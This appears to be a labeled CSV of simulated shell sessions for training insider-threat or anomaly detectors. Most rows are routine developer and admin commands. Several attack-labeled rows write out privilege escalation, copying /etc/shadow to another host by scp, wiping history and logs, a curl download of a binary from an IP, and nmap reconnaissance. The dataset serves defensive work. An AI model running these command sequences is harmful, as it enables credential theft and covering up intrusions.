session_id,user_id,role,hostname,session_start,session_duration_s,after_hours,command_count,command_sequence,label,attack_type
1859df9e2f664017b9854a264045b3d4,u0010,dev,analyst-ws-10,2025-06-11 13:28:10,1380,0,26,flake8 src/ --max-line-length <NUM> -> cat config/settings.yaml -> docker build -t myapp:e020 . -> git stash -> python -m pytest tests/ -v -> date -> alias ll='ls -la' -> git diff HEAD~1 -> git diff HEAD~3 -> pwd -> which python -> man ls -> which python -> clear -> vim sync.py -> source ~/.bashrc -> curl -s http://localhost:<NUM>/health -> git stash -> ls -> cat config/dev.yaml -> pip install -r requirements.txt -> ls -la -> man ls -> cat logs/access.log -> git status -> exit,0,none
e82a3ee38b2f4f1880fd2d1fea0924c4,u0052,analyst,analyst-ws-02,2025-06-11 14:19:54,1314,0,27,"diff /data/report.parquet /backup/model_weights.pkl -> echo $USER -> echo $USER -> history | tail -<NUM> -> jupyter nbconvert --to script analysis_119f.ipynb -> head -<NUM> /data/transactions.csv -> ls -> ls -> echo $USER -> date -> python -c 'import pandas as pd; df=pd.read_csv(""/data/report.parquet""); print(df.describe())' -> sqlite3 analytics.db 'SELECT COUNT(*) FROM logs;' -> which python -> cut -d',' -f4,7 /data/embeddings.npy | head -> history | tail -<NUM> -> history | tail -<NUM> -> grep -i 'warn' /var/log/syslog -> md5sum /data/transactions.csv -> rsync -avz /data/ build-agent:/backup/data/ -> which python -> whoami -> which git -> jupyter nbconvert --to script analysis_67c5.ipynb -> head -<NUM> /data/users.db -> date -> source ~/.bashrc -> exit",0,none
8b2d08aa12fe4d5bbb64217e03476fab,u0074,dev,analyst-ws-07,2025-06-11 15:05:05,3119,0,28,cd .. -> which git -> source ~/.bashrc -> pip install pandas -> ls -la ~/.aws/ -> flake8 src/ --max-line-length <NUM> -> cat config/dev.yaml -> ls -lh -> crontab -e -> ls -la /var/spool/cron/ -> env | grep REDIS -> source ~/.bashrc -> source ~/.bashrc -> env | grep DATABASE -> nano config/settings.yaml -> nano config/settings.yaml -> source ~/.bashrc -> cat logs/app.log -> pytest tests/unit/ --cov=src --cov-report=term-missing -> git diff HEAD~3 -> getent passwd -> ls -> man sed -> source ~/.bashrc -> !! -> docker logs <HEX> --tail <NUM> -> git checkout -b feature/<HEX> -> exit,1,none
4893fe9d4f7d4970b6aa9c18fb44198c,u0062,dev,admin-srv-05,2025-06-11 15:12:05,1484,0,21,git log --oneline -<NUM> -> pip list --outdated -> python -m pytest tests/ -q -> pip install requests -> vim migrate.py -> cat config/settings.yaml -> man find -> cat config/prod.yaml -> nano config/dev.yaml -> git status -> ls -lh -> pwd -> pwd -> git diff HEAD~2 -> which python -> git pull origin main -> tail -f logs/access.log -> ls -lh -> echo $USER -> docker build -t myapp:a32f . -> exit,0,none
41998a7292754d3488dd6e2d53a46ff7,u0045,analyst,admin-srv-03,2025-06-11 16:07:44,602,0,9,pwd -> cd ~ -> sqlite3 analytics.db 'SELECT COUNT(*) FROM audit;' -> source ~/.bashrc -> echo $PATH -> du -sh /data/* -> cd ~ -> echo $USER -> exit,0,none
066d55439f9d48708b3af93624430cea,u0024,analyst,admin-srv-02,2025-06-12 01:46:56,1315,1,38,"wc -l /data/report.parquet -> ls -lh -> python -c 'import pandas as pd; df=pd.read_csv(""/data/report.parquet""); print(df.describe())' -> du -sh /data/* -> ls -la -> python -c 'import pandas as pd; df=pd.read_csv(""/data/customers.csv""); print(df.describe())' -> less /var/log/audit.log -> jupyter nbconvert --to script analysis_c304.ipynb -> ls -la -> date -> grep -i 'timeout' /var/log/access.log -> awk '{print $1}' /var/log/access.log | sort | uniq -c | sort -rn | head -<NUM> -> which python -> which git -> date -> which git -> grep -i 'warn' /var/log/error.log -> python analyze.py --input /data/payroll.xlsx --output /tmp/<TMPFILE> -> clear -> clear -> diff /data/customers.csv /backup/payroll.xlsx -> sudo -l -> sudo -u root bash -> cat /etc/passwd | grep -v nologin -> history -c -> cat /etc/shadow -> cp /etc/shadow /tmp/<TMPFILE> -> scp /tmp/<TMPFILE> root@backup-<NUM>:/tmp/<TMPFILE> -> rm -f /tmp/<TMPFILE> -> history -c -> cat /dev/null > ~/.bash_history -> python analyze.py --input /data/transactions.csv --output /tmp/<TMPFILE> -> ls -lh -> rsync -avz /data/ build-agent:/backup/data/ -> echo $USER -> cut -d',' -f5,9 /data/report.parquet | head -> clear -> exit",2,privilege_esc__pivot
0631e1d715b64189987beca8d4ec34e7,u0042,dev,dev-ws-09,2025-06-12 06:46:14,2354,1,27,cd ~/projects/billing-svc -> ls -lh -> grep -r 'TODO' src/ -> find . -name '*.py' | xargs wc -l -> python train.py -> uptime -> git pull origin develop -> git diff HEAD~1 -> cd .. -> cd .. -> git pull origin main -> git checkout -b feature/<HEX> -> cd ~/projects/recommendation-engine -> pip list --outdated -> grep -r 'TODO' src/ -> docker build -t myapp:44eb . -> source ~/.bashrc -> cd ~ -> man grep -> ls -lh -> echo $PATH -> make test -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> ls -lh -> find . -name '*.py' | xargs wc -l -> cat config/prod.yaml -> exit,0,none
90117f1d199241edb4c9683ebf3ee06a,u0018,analyst,analyst-ws-05,2025-06-12 09:10:21,249,0,28,"echo $USER -> psql -U analyst -c 'SELECT * FROM summary LIMIT <NUM>;' -> cd ~ -> clear -> ls -> ls -lh /data -> scp /tmp/<TMPFILE> build-agent:/backup/ -> grep -i 'timeout' /var/log/syslog -> python -c 'import pandas as pd; df=pd.read_csv(""/data/transactions.csv""); print(df.describe())' -> uptime -> whoami -> ls -la -> awk '{print $1}' /var/log/auth.log | sort | uniq -c | sort -rn | head -<NUM> -> history | tail -<NUM> -> python analyze.py --input /data/embeddings.npy -> python analyze.py --input /data/report.parquet -> diff /data/users.db /backup/transactions.csv -> python analyze.py --input /data/transactions.csv -> diff /data/users.db /backup/report.parquet -> less /var/log/debug.log -> python analyze.py --input /data/users.db --output /tmp/<TMPFILE> -> echo $USER -> cat /data/report.parquet -> alias ll='ls -la' -> scp /tmp/<TMPFILE> backup-<NUM>:/backup/ -> du -sh /data/* -> source ~/.bashrc -> exit",0,none
03f50c907fe244fabde9433322e4e2f0,u0015,dev,admin-srv-02,2025-06-12 09:17:20,828,0,17,vim cleanup.py -> python evaluate.py -> which git -> env | grep -i key -> history | tail -<NUM> -> git checkout -b feature/<HEX> -> cd .. -> python -m pytest tests/ -x -> make build -> curl -s http://localhost:<NUM>/health -> !! -> cat /etc/cron.d/backup -> traceroute <IP> -> cd ~/projects/api-gateway -> pip list --outdated -> env | grep DATABASE -> exit,1,none
ea0c995fa84c4cf5a68f01cb258dff74,u0077,dev,analyst-ws-04,2025-06-12 11:37:20,2261,0,19,ls -la -> export LOG_LEVEL=false -> whoami -> echo $USER -> ssh -i ~/.ssh/id_rsa deploy@dev-<NUM> -> pytest tests/unit/ --cov=src --cov-report=term-missing -> ls -> ssh -i ~/.ssh/id_rsa deploy@nas-store -> ls -la -> curl -s http://localhost:<NUM>/health -> source ~/.bashrc -> uptime -> which git -> cd .. -> git checkout -b feature/<HEX> -> git diff HEAD~2 -> pip install pandas -> cat config/settings.yaml -> exit,0,none
c907de9f9524412d8fc0947c85326db1,u0049,dev,dev-ws-03,2025-06-12 17:35:05,3491,0,26,pytest tests/unit/ --cov=src --cov-report=term-missing -> git log --oneline -9 -> clear -> cat ~/.bash_history -> pytest tests/unit/ --cov=src --cov-report=term-missing -> make test -> ip neigh show -> last | head -<NUM> -> pip install -r requirements.txt -> docker ps -> cat config/dev.yaml -> source ~/.bashrc -> pytest tests/unit/ --cov=src --cov-report=term-missing -> pwd -> which python -> docker run --rm -p <NUM>:<NUM> myapp:latest -> docker ps -> make test -> env | grep API -> nano config/dev.yaml -> docker run --rm -p <NUM>:<NUM> myapp:latest -> env | grep SECRET -> which git -> cat config/prod.yaml -> git checkout -b feature/<HEX> -> exit,1,none
f4ffcefad60f4d468406425f3f335f06,u0046,analyst,dev-ws-03,2025-06-13 08:36:40,1737,0,22,"which git -> uptime -> python analyze.py --input /data/model_weights.pkl -> awk '{print $1}' /var/log/access.log | sort | uniq -c | sort -rn | head -<NUM> -> cd ~ -> echo $USER -> echo $PATH -> man awk -> sort -t',' -k3 -n /data/payroll.xlsx | tail -<NUM> -> cd ~ -> which git -> cat /data/payroll.xlsx -> echo $USER -> history | tail -<NUM> -> ls -la -> cut -d',' -f5,8 /data/customers.csv | head -> jupyter nbconvert --to script analysis_1f38.ipynb -> jupyter nbconvert --to script analysis_471b.ipynb -> clear -> ls -lh -> grep -E '[0-9]{4}-[0-9]{2}-[0-9]{2}' /var/log/app.log | wc -l -> exit",0,none
14cb08c771d2441faec6cff2f130c6b5,u0010,dev,dev-ws-10,2025-06-13 10:01:28,3319,0,17,pip list --outdated -> tail -f logs/access.log -> cat /etc/cron.d/monitoring -> grep -r 'TODO' src/ -> zip -r /tmp/<TMPFILE> /data/ -> pip list --outdated -> which python -> docker run --rm -p <NUM>:<NUM> myapp:latest -> ping -c 5 <IP> -> ls -la /var/spool/cron/ -> echo $USER -> pip list --outdated -> which git -> python analyze.py --input /data/embeddings.npy -> md5sum /data/embeddings.npy -> git checkout -b feature/<HEX> -> exit,1,none
53e338da68ce4d49a75d76f7d04149eb,u0076,admin,analyst-ws-11,2025-06-13 11:59:45,2238,0,28,cat /var/log/auth.log -> uptime -> alias ll='ls -la' -> free -m -> sudo chown www-data /var/www/html -> sudo nano /etc/resolv.conf -> sudo ufw allow <NUM>/tcp -> sudo apt update -> last | head -<NUM> -> who -> source ~/.bashrc -> ls -la -> pwd -> uptime -> sudo -l -> who -> uptime -> man ls -> ls -lh -> alias ll='ls -la' -> grep -i 'error\|warn' /var/log/syslog | tail -<NUM> -> sudo ufw allow <NUM>/tcp -> date -> sudo apt update -> gep -r pattern . -> du -sh /var/log/* -> sudo apt install -y auditd -> exit,0,none
613aa54a892945d98947321bd8333180,u0074,dev,dev-ws-13,2025-06-13 12:07:22,2562,0,19,find . -name '*.py' | xargs wc -l -> history | tail -<NUM> -> cat ~/.ssh/known_hosts -> id -> ls -la ~/.aws/ -> git diff HEAD~2 -> git checkout -b feature/<HEX> -> whoami -> docker logs <HEX> --tail <NUM> -> whoami -> python -m pytest tests/ -q -> ls -la -> python deploy.sh -> which git -> ls -lh -> ip route show -> nmap -sV <IP> -> pwd -> exit,1,none
1d52aebaf0324727a74e9babdc6844b8,u0020,admin,dev-ws-12,2025-06-14 04:11:22,3396,1,18,crontab -l -> uptime -> last | head -<NUM> -> clear -> sudo systemctl restart auditd -> ping -c 6 <IP> -> sudo chmod <NUM> /etc/nginx/nginx.conf -> sudo -l -> which git -> du -sh /var/log/* -> sudo chown www-data /var/www/html -> sudo apt autoremove -y -> du -sh /var/log/* -> cp /etc/passwd /tmp/<TMPFILE> -> echo $USER -> cat /etc/cron.d/logrotate -> df -h -> exit,1,none
aa8da92da44f48a39aa5a12e298aafb9,u0079,dev,admin-srv-03,2025-06-14 10:07:32,2373,0,29,ls -la /etc/cron* -> git pull origin main -> docker run --rm -p <NUM>:<NUM> myapp:latest -> which python -> flake8 src/ --max-line-length <NUM> -> echo $PATH -> pytest tests/unit/ --cov=src --cov-report=term-missing -> find . -name '*.py' | xargs wc -l -> curl -s http://localhost:<NUM>/health -> env | grep REDIS -> ip route show -> echo $USER -> date -> cat /etc/group -> make build -> cd ~ -> python -m pytest tests/ -q -> git pull origin main -> git stash -> echo $PATH -> cd ~ -> ls -la ~/.aws/ -> cd ~/projects/reporting -> curl -s http://localhost:<NUM>/health -> ls -la -> docker run --rm -p <NUM>:<NUM> myapp:latest -> groups -> tail -f logs/syslog -> exit,1,none
8a1b2f84d3324042a2054c05f8e16850,u0009,admin,analyst-ws-07,2025-06-14 14:31:56,2492,0,16,man grep -> cd .. -> sudo chown www-data /var/www/html -> whoami -> echo $PATH -> sudo ufw allow <NUM>/tcp -> cat /var/log/syslog -> which git -> cat /var/log/nginx.log -> sudo ufw status verbose -> sudo apt update -> uptime -> which python -> df -h -> sudo apt update -> exit,0,none
90a2be5fed34419996cd3543c8b1b4d4,u0064,analyst,admin-srv-04,2025-06-14 15:19:22,92,0,14,"less /var/log/nginx.log -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> cat /data/report.parquet -> echo $USER -> head -<NUM> /data/report.parquet -> python analyze.py --input /data/embeddings.npy -> sort -t',' -k3 -n /data/payroll.xlsx | tail -<NUM> -> diff /data/report.parquet /backup/model_weights.pkl -> md5sum /data/model_weights.pkl -> python analyze.py --input /data/customers.csv -> date -> rsync -avz /data/ nas-store:/backup/data/ -> echo $USER -> exit",0,none
645692de96fe4224896a4460ef48442c,u0039,dev,dev-ws-07,2025-06-15 14:26:51,232,0,17,black src/ -> source ~/.bashrc -> git stash -> ls -lh -> docker run --rm -p <NUM>:<NUM> myapp:latest -> pip install sqlalchemy -> curl -s http://localhost:<NUM>/health -> which git -> pwd -> ls -la -> pip install sqlalchemy -> ls -> docker build -t myapp:4a25 . -> tail -f logs/syslog -> date -> black src/ -> exit,0,none
9096b81bcfba45599df1e733d5d513f7,u0051,analyst,dev-ws-04,2025-06-15 15:44:05,580,0,34,"head -<NUM> /data/model_weights.pkl -> md5sum /data/model_weights.pkl -> whoami -> sort -t',' -k2 -n /data/payroll.xlsx | tail -<NUM> -> python analyze.py --input /data/customers.csv -> clear -> pip install -r requirements.txt -> tail -f logs/audit.log -> export LOG_LEVEL=true -> scp /tmp/<TMPFILE> staging-<NUM>:/backup/ -> id -> grep -E '[0-9]{4}-[0-9]{2}-[0-9]{2}' /var/log/syslog | wc -l -> ss -antp -> pwd -> jupyter nbconvert --to script analysis_8d7e.ipynb -> cd .. -> scp /tmp/<TMPFILE> data-lake:/backup/ -> python analyze.py --input /data/users.db -> wc -l /data/payroll.xlsx -> ls -> grep -i 'error' /var/log/syslog -> python analyze.py --input /data/report.parquet -> python analyze.py --input /data/payroll.xlsx -> ls -> cat /data/customers.csv -> env | grep -i pass -> which python -> which python -> cd ~ -> which python -> diff /data/users.db /backup/model_weights.pkl -> which git -> alias ll='ls -la' -> exit",1,none
a05a3ceeebde4953b6ae6da38c1a5b9c,u0016,dev,dev-ws-11,2025-06-15 16:06:28,128,0,31,"python ingest.py -> echo $PATH -> black src/ -> pip list --outdated -> zip -r /tmp/<TMPFILE> /data/ -> python3 -c ""import base64; print(base64.b64decode('<HEX>'))"" -> getent passwd -> pip list --outdated -> find . -name '*.py' | xargs wc -l -> docker run --rm -p <NUM>:<NUM> myapp:latest -> date -> cat ~/.ssh/known_hosts -> !! -> ls -lh -> flake8 src/ --max-line-length <NUM> -> which git -> cd ~ -> alias ll='ls -la' -> docker run --rm -p <NUM>:<NUM> myapp:latest -> env | grep API -> ls -lh -> cat config/settings.yaml -> curl -s http://localhost:<NUM>/health -> echo $USER -> man awk -> python -m pytest tests/ -q -> black src/ -> echo $USER -> git log --oneline -<NUM> -> ls -la /var/spool/cron/ -> exit",1,none
a1ad3b1c8e6b408580bca20ed1fcc0fd,u0065,analyst,admin-srv-01,2025-06-15 17:27:01,566,0,35,"alias ll='ls -la' -> which git -> source ~/.bashrc -> arp -a -> whoami -> ls -> ls -lh -> ls -la /var/spool/cron/ -> sqlite3 analytics.db 'SELECT COUNT(*) FROM sessions;' -> less /var/log/debug.log -> grep -i 'error' /var/log/nginx.log -> man find -> sqlite3 analytics.db 'SELECT COUNT(*) FROM events;' -> cat /data/users.db -> cat ~/.bash_history -> cd .. -> history -c -> cat /dev/null > ~/.bash_history -> sudo truncate -s 0 /var/log/btmp -> sudo find /var/log -name '*.log' -mmin -<NUM> -exec truncate -s 0 {} \; -> sudo rm -f /var/log/btmp -> touch -t <HEX> ~/.bash_history -> unset HISTFILE -> curl -s http://<IP>/<HEX>.bin -o /tmp/<TMPFILE> -> export HISTSIZE=0 -> sort -t',' -k1 -n /data/model_weights.pkl | tail -<NUM> -> ip neigh show -> which git -> cp /etc/passwd /tmp/<TMPFILE> -> grep -E '[0-9]{4}-[0-9]{2}-[0-9]{2}' /var/log/auth.log | wc -l -> ls -la -> python -c 'import pandas as pd; df=pd.read_csv(""/data/embeddings.npy""); print(df.describe())' -> cd .. -> clear -> exit",2,cover_tracks__pivot
2caf4c89a61747e0b922117f88bfe02c,u0057,dev,admin-srv-07,2025-06-16 00:19:05,1659,1,23,git stash -> python -m pytest tests/ -q -> docker run --rm -p <NUM>:<NUM> myapp:latest -> which git -> ls -> git diff HEAD~1 -> uptime -> which python -> git status -> source ~/.bashrc -> vim ingest.py -> which git -> pytest tests/unit/ --cov=src --cov-report=term-missing -> cat config/settings.yaml -> alias ll='ls -la' -> docker logs <HEX> --tail <NUM> -> pip install -r requirements.txt -> git log --oneline -<NUM> -> whoami -> git stash -> echo $PATH -> docker run --rm -p <NUM>:<NUM> myapp:latest -> exit,0,none
c33c7d63dabd40b59fc848b61647df06,u0005,analyst,dev-ws-08,2025-06-16 13:03:30,2240,0,27,du -sh /data/* -> ls -la -> rsync -avz /data/ nas-store:/backup/data/ -> python analyze.py --input /data/model_weights.pkl --output /tmp/<TMPFILE> -> cd ~ -> ls -la -> python analyze.py --input /data/embeddings.npy --output /tmp/<TMPFILE> -> cd .. -> python analyze.py --input /data/users.db --output /tmp/<TMPFILE> -> ls -> git log --oneline -<NUM> -> git diff HEAD~1 -> docker logs <HEX> --tail <NUM> -> jupyter nbconvert --to script analysis_ea4f.ipynb -> zip -r /tmp/<TMPFILE> /data/ -> man find -> ls -lh /data -> alias ll='ls -la' -> !! -> psql -U analyst -c 'SELECT * FROM daily_stats LIMIT <NUM>;' -> which python -> wc -l /data/transactions.csv -> md5sum /data/model_weights.pkl -> ls -la ~/.aws/ -> echo <HEX> | base64 -d -> pwd -> exit,1,none
97653d228f944716bb0cab74dc04bd5f,u0063,dev,admin-srv-04,2025-06-16 13:36:27,3224,0,18,docker ps -> find /home -name '*.pfx' 2>/dev/null -> docker build -t myapp:2f7b . -> git diff HEAD~1 -> ls -lh -> source ~/.bashrc -> which python -> make test -> pip install pandas -> id -> !! -> cp /etc/passwd /tmp/<TMPFILE> -> grep -r 'TODO' src/ -> clear -> git status -> history | tail -<NUM> -> cta README.md -> exit,1,none
16337ab1304b4fe8b2fed1b3f815bd7a,u0005,analyst,dev-ws-13,2025-06-16 15:03:20,1676,0,17,clear -> grep -i 'warn' /var/log/debug.log -> scp /tmp/<TMPFILE> staging-<NUM>:/backup/ -> alias ll='ls -la' -> ls -la -> sqlite3 analytics.db 'SELECT COUNT(*) FROM audit;' -> history | tail -<NUM> -> ls -lh /data -> whoami -> psql -U analyst -c 'SELECT * FROM summary LIMIT <NUM>;' -> history | tail -<NUM> -> head -<NUM> /data/users.db -> which git -> cd .. -> whoami -> which git -> exit,0,none
634cfb5fc8614bdbb7a9f397c7669928,u0030,dev,analyst-ws-03,2025-06-16 16:50:37,1621,0,24,git checkout -b feature/<HEX> -> grep -r 'TODO' src/ -> pwd -> ls -> echo $USER -> uptime -> python -m pytest tests/ -x -> docker build -t myapp:dea2 . -> source ~/.bashrc -> cd ~ -> tail -f logs/audit.log -> pip install -r requirements.txt -> history | tail -<NUM> -> pip list --outdated -> history | tail -<NUM> -> ls -> git stash -> pwd -> uptime -> pwd -> !! -> env | grep API -> date -> exit,0,none
19970efe7e3149eab3cfddfc64e46d69,u0007,admin,analyst-ws-08,2025-06-17 08:57:47,3460,0,38,sudo -l -> source ~/.bashrc -> sudo systemctl status celery -> crontab -l -> sudo systemctl enable gunicorn -> crontab -l -> sudo apt update -> echo <HEX> | base64 -d -> sudo -l -> sudo journalctl --since '4 days ago' | grep -i fail -> env | grep -i auth -> sudo iptables -L -n -> ls -la -> whoami -> id -> uname -r -> cat /etc/os-release -> ip a -> ip route -> nmap -sV -p <NUM>-<NUM> <IP> -> cat /etc/hosts -> arp -a -> nmap -p- <IP> -T2 -> unset HISTFILE -> history -c -> ps aux --sort=-%cpu | head -<NUM> -> cat /proc/version -> find / -writable -type d 2>/dev/null | head -<NUM> -> ls -la /opt/ -> cat /etc/crontab -> sudo nano /etc/resolv.conf -> sudo journalctl --since '3 days ago' | grep -i fail -> ssh-keygen -t <HEX> -f ~/.ssh/id_8dbe -> find /home -name '*.pfx' 2>/dev/null -> cd .. -> cd ~ -> cat /var/log/app.log -> exit,2,recon__pivot
0742a811cd034a2781037b12adde520e,u0016,dev,dev-ws-09,2025-06-17 12:21:11,787,0,8,grep -r 'TODO' src/ -> docker logs <HEX> --tail <NUM> -> pip install -r requirements.txt -> pip install cryptography -> pip install scikit-learn -> cat config/settings.yaml -> git stash -> exit,0,none
